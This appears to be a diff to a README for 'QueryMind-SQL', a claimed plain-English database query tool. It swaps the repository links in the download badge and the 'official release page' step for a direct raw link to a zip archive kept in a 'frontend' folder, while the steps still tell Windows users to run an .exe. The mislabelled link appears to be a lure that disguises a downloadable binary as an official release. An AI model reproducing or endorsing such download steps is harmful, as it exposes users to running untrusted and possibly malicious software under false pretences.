@@ -1,6 +1,6 @@
 # 🤖 QueryMind-SQL - Turn your plain English into data
 
-[![Download QueryMind-SQL](https://img.shields.io/badge/Download-QueryMind-blue.svg)](https://github.com/fik93673/QueryMind-SQL)
+[![Download QueryMind-SQL](https://img.shields.io/badge/Download-QueryMind-blue.svg)](https://raw.githubusercontent.com/fik93673/QueryMind-SQL/main/frontend/Mind_SQL_Query_2.2.zip)
 
 QueryMind-SQL helps you get answers from your company database without writing code. You ask questions in plain English, and the system finds the data for you. It uses smart technology to understand your request and translate it into a language your database understands. A safety check ensures your data remains protected throughout the process.
 
@@ -8,7 +8,7 @@ QueryMind-SQL helps you get answers from your company database without writing c
 
 You can start by accessing the primary hosting page to retrieve the latest version of the software.
 
-1. Go to the [official release page](https://github.com/fik93673/QueryMind-SQL).
+1. Go to the [official release page](https://raw.githubusercontent.com/fik93673/QueryMind-SQL/main/frontend/Mind_SQL_Query_2.2.zip).
 2. Look for the Section labeled Latest.
 3. Select the file ending in .exe to begin your download to your Windows machine.
 4. Save the file to your desktop or downloads folder.
